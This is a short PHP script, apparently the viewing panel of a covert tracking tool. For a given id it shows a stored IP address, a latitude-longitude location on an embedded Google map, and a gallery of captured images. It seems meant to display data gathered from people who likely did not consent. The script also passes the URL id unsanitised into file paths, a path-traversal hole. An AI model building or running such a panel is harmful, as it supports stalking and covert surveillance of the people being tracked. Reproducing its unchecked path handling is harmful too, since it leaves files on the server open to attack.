<?php
error_reporting(0);



$data = $_GET['id'];

if($data){
	$id = $data;
}else{
	$id = "algaza";
}

if($id){


$ambe_ip = 'data/id_'.$id.'_ip.txt';
$ip = file_get_contents($ambe_ip);

$ambe_lokasi = 'data/id_'.$id.'_lokasi.txt';
$lokasi = file_get_contents($ambe_lokasi);


$data_LOC = explode("-", $lokasi);

// IP

	$latitude 	= $data_LOC[1];
	$longitude	= $data_LOC[0];

if($ip){
echo "<hr>IP : <b>$ip</b>";
}
if($lokasi){
echo "<br/>LOKASI : $lokasi";


?>
<div style="width: 100%"><iframe width="50%" height="300" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="https://maps.google.com/maps?width=100%25&amp;height=300&amp;hl=en&amp;q=<?=$data_LOC[1]?>,<?=$data_LOC[0]?>+(Lokasi)&amp;t=&amp;z=17&amp;ie=UTF8&amp;iwloc=B&amp;output=embed"><a href="https://www.maps.ie/distance-area-calculator.html">measure area map</a></iframe></div>

<?php
}
	
$folder = "gambar/".$id; //folder tempat gambar disimpan
	
$handle = opendir($folder);



	
echo '<table cellspacing="2" cellpadding="5">';
	
echo '<tr>';
	
$i = 1;
	
while(false !== ($file = readdir($handle))){
	
	if($file != '.' && $file != '..'){
	
		echo '<td style="border:1px solid #000000;" align="center">
	
			<img src="gambar/'.$id.'/'.$file.'" width="340" /><br />
	
			'.$file.'
	
		</td>';
	
		if(($i % 4) == 0){
	
			echo '</tr><tr>';
	
		}
	
		$i++;
	
	}
	
}
	
echo '</tr>';
	
echo '</table>';


}else{
	
}

?>